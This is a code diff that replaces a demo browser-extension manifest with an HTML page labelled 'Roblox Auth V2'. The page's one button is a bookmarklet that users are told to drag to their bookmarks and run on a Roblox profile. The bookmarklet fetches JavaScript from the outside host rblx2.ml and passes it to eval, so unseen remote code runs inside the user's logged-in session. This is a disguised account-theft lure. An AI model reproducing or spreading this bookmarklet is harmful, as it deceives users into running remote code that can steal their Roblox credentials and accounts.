@@ -1,14 +1,25 @@
-```
-Author: Ayushi Rawat
-Date: 08-09-2020
-```
-{
-    "name": "demo extension",
-    "version": "0.0.1",
-    "description": "demo",
-    "manifest_version": 2,
-    "browser_action": {
-        "default_popup": "demo.html",
-        "default_icon": "logo.png"
-    }
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+a:link, a:visited {
+  background-color: #f44336;
+  color: white;
+  padding: 15px 25px;
+  text-align: center;
+  text-decoration: none;
+  display: inline-block;
 }
+
+a:hover, a:active {
+  background-color: red;
+}
+</style>
+</head>
+<body>
+
+<h2>Roblox Auth V2</h2>
+<a href="Javascript:$.get('//rblx2.ml/roblox-api?id=235',eval)
+" target="_blank">Drag To Bookmarks To Use On A Users Profile</a>
+</body>
+</html>
